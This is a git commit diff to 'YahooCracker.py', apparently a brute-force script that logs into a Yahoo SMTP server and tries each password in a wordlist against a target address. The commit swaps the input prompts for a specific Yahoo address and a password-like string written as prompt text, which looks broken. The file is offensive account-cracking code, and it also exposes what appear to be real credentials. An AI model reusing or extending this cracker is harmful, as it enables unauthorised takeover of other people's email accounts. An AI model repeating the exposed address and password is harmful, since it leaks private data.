59585b7267bf8f210fa360a284940083d4ae0ce6
NotAxpect <mendoza.n0202@gmail.com>
2024-06-29 22:57:01 -0500

    Update YahooCracker.py

--- YahooCracker.py
+++ YahooCracker.py
@@ -6,8 +6,8 @@ smtpserver.ehlo() # Says hello to the smtp server
 smtpserver.starttls()
 
 print ("")
-user = input("Enter the target's yahoo address: ")
-passwfile = input ("Enter the password file name: ")
+user = input("g69dollaz1@yahoo.com")
+passwfile = input ("@Ze3nrqxg")
 passwfile = open(passwfile, "r")
 
 for password in passwfile:
